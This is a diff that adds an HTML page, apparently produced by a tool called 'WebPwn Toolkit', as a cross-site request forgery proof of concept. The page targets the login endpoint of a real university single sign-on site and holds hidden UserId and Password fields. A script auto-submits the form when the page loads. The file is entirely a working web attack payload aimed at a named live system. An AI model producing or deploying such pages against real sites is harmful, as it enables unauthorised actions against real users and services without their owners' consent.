@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<!-- WebPwn Toolkit — CSRF PoC: Missing CSRF Token -->
+<html>
+<head><title>CSRF PoC — Missing CSRF Token</title></head>
+<body>
+<h1>CSRF PoC</h1>
+<p>Check: <strong>Missing CSRF Token</strong></p>
+<p>Target: <code>https://sso.aztu.edu.az/Home/Login</code></p>
+<form id="csrf_poc" action="https://sso.aztu.edu.az/Home/Login" method="POST">
+  <input type="hidden" name="UserId" value="">
+  <input type="hidden" name="Password" value="">
+</form>
+<script>document.getElementById('csrf_poc').submit();</script>
+</body>
+</html>
